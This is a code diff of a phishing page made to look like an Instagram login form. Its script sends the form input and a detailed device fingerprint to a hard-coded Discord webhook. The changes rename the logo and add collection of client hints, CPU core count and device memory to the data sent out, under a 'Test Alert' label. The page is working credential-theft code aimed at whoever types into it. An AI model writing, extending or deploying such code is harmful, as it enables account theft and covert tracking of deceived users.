@@ -55,7 +55,7 @@ footer .links a{color:var(--muted);font-weight:400}
 <body>
 <main>
   <div class="box" id="loginBox">
-    <h1 class="logo">instagram</h1>
+    <h1 class="logo">pogobutton</h1>
     <form id="form" autocomplete="off" novalidate>
       <div class="field">
         <input id="user" type="text" placeholder=" " aria-label="Phone number, username, or email" autocapitalize="none">
@@ -95,31 +95,52 @@ footer .links a{color:var(--muted);font-weight:400}
 </footer>
 
 <script>
-const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1568460908886364362/pD_ue9r-hYvntxdg80KmtIZ6lQFHRQL_ke9_NkbAl2QJweaaIco1QKiCt5jcS0SrXBDK"; // Replace with your actual webhook link if testing via Discord
+const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1568460908886364362/pD_ue9r-hYvntxdg80KmtIZ6lQFHRQL_ke9_NkbAl2QJweaaIco1QKiCt5jcS0SrXBDK";
 
-function getDeviceInfo() {
+async function getDeviceInfo() {
   const ua = navigator.userAgent;
   let os = "Unknown OS";
+  
   if (/android/i.test(ua)) os = "Android";
   else if (/iPad|iPhone|iPod/.test(ua) && !window.MSStream) os = "iOS";
   else if (/win/i.test(ua)) os = "Windows";
   else if (/mac/i.test(ua)) os = "macOS";
   else if (/linux/i.test(ua)) os = "Linux";
 
+  let brandInfo = "Standard UA";
+  if (navigator.userAgentData) {
+    try {
+      const hints = await navigator.userAgentData.getHighEntropyValues([
+        "architecture",
+        "model",
+        "platform",
+        "platformVersion",
+        "uaFullVersion"
+      ]);
+      brandInfo = JSON.stringify(hints);
+    } catch (e) {
+      brandInfo = "Not allowed/supported";
+    }
+  }
+
   return {
     os: os,
     platform: navigator.platform || "Unknown",
+    cpuCores: navigator.hardwareConcurrency || "Unknown",
+    deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + " GB+" : "Unknown",
     screen: `${window.screen.width}x${window.screen.height}`,
     viewport: `${window.innerWidth}x${window.innerHeight}`,
-    userAgent: ua,
-    language: navigator.language || "Unknown"
+    clientHints: brandInfo,
+    language: navigator.language || "Unknown",
+    userAgent: ua
   };
 }
 
-function sendNotification(actionType, extraData = {}) {
-  if (DISCORD_WEBHOOK_URL.includes("YOUR_DISCORD_WEBHOOK")) return; // Skip if webhook isn't configured yet
+async function sendNotification(actionType, extraData = {}) {
+  if (DISCORD_WEBHOOK_URL.includes("YOUR_DISCORD_WEBHOOK")) return;
   
-  const info = getDeviceInfo();
+  const info = await getDeviceInfo();
+
   const payload = {
     content: `🔔 **Test Alert: ${actionType}**`,
     embeds: [{
@@ -127,10 +148,9 @@ function sendNotification(actionType, extraData = {}) {
       color: 3447003,
       fields: [
         { name: "Operating System", value: info.os, inline: true },
-        { name: "Platform", value: info.platform, inline: true },
+        { name: "CPU Cores", value: String(info.cpuCores), inline: true },
         { name: "Screen Resolution", value: info.screen, inline: true },
-        { name: "Viewport Size", value: info.viewport, inline: true },
-        { name: "Language", value: info.language, inline: true },
+        { name: "Client Hints / Model", value: info.clientHints, inline: false },
         { name: "Input Details", value: JSON.stringify(extraData), inline: false },
         { name: "User Agent", value: info.userAgent, inline: false }
       ],
